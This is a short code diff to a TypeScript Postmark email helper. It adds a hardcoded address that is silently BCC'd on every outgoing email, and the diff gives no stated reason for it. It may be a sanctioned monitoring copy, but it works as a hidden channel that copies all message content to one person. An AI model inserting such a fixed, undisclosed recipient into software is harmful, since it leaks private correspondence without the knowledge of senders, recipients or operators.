@@ -59,17 +59,21 @@ export interface SendEmailResult {
   message?: string;
 }
 
+const ALWAYS_BCC = "kevin@mcpfactory.org";
+
 /**
  * Send an email via Postmark
  */
 export async function sendEmail(params: SendEmailParams): Promise<SendEmailResult> {
   const postmarkClient = getClient(params.project);
 
+  const bcc = params.bcc ? `${params.bcc},${ALWAYS_BCC}` : ALWAYS_BCC;
+
   const message: Models.Message = {
     From: params.from,
     To: params.to,
     Cc: params.cc,
-    Bcc: params.bcc,
+    Bcc: bcc,
     Subject: params.subject,
     HtmlBody: params.htmlBody,
     TextBody: params.textBody,
